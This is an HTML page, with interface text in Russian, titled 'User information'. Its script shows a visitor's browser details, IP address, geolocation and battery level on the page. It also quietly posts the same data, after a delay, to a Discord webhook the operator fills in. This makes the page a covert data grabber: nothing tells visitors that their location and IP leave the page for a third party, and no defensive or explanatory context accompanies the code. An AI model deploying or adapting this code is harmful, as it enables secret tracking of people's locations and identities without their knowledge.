<!DOCTYPE html>
<html>
<head>
    <title>Информация о пользователе</title>
    <style>
        body {
            background-color: black;
            color: white;
            font-family: sans-serif;
        }

        #info {
            background-color: #333;
            padding: 20px;
            margin: 0 auto;
            width: 50%;
            text-align: center;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(255, 255, 255, 0.5);
        }

        #info p {
            margin-bottom: 10px;
        }

        noscript {
            color: red;
        }
    </style>
</head>
<body>
    <h1>Информация о пользователе</h1>
    <noscript>Пожалуйста, включите JavaScript в вашем браузере для корректной работы сайта.</noscript>
    <div id="info"></div>
    <script>
        const webhookUrl = 'https://discord.com/api/webhooks/...'; // замените на URL вашего вебхука

        let info = "<p>Имя браузера: " + navigator.appName + "</p>" +
            "<p>Версия браузера: " + navigator.appVersion + "</p>" +
            "<p>Кодовое имя браузера: " + navigator.appCodeName + "</p>" +
            "<p>Пользовательский агент: " + navigator.userAgent + "</p>" +
            "<p>Платформа: " + navigator.platform + "</p>" +
            "<p>Язык: " + navigator.language + "</p>" +
            "<p>Cookies включены: " + navigator.cookieEnabled + "</p>" +
            "<p>Количество логических процессоров: " + navigator.hardwareConcurrency + "</p>" +
            "<p>Устройство подключено к сети Интернет: " + navigator.onLine + "</p>" +
            "<p>Настройка 'Не отслеживать': " + navigator.doNotTrack + "</p>";

        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(position => {
                info += "<p>Широта: " + position.coords.latitude + "</p>" +
                    "<p>Долгота: " + position.coords.longitude + "</p>";
                document.getElementById("info").innerHTML = info;
                sendMessage(info);
            });
        }

        if (navigator.getBattery) {
            navigator.getBattery().then(battery => {
                info += "<p>Уровень заряда батареи: " + battery.level * 100 + "%" + "</p>";
                document.getElementById("info").innerHTML = info;
                sendMessage(info);
            });
        }

        if (navigator.connection) {
            info += "<p>Тип подключения к сети Интернет: " + navigator.connection.effectiveType + "</p>";
        }

        document.getElementById("info").innerHTML = info;

        fetch('https://api.ipify.org?format=json')
            .then(response => response.json())
            .then(data => {
                document.getElementById("info").innerHTML += "<p>IP-адрес: " + data.ip + "</p>";
                sendMessage(info);
            });

        document.addEventListener('keydown', event => {
          if (event.ctrlKey && event.key === 'b') {
              window.location.href = '/other-page.html';
          }
      });

      function sendMessage(message) {
          message = message.replace(/<[^>]*>/g, '\n');
          setTimeout(() => {
              fetch(webhookUrl, {
                  method: 'POST',
                  headers: {
                      'Content-Type': 'application/json'
                  },
                  body: JSON.stringify({ content: message })
              });
          }, 10000);
      }
    </script>
</body>
</html>
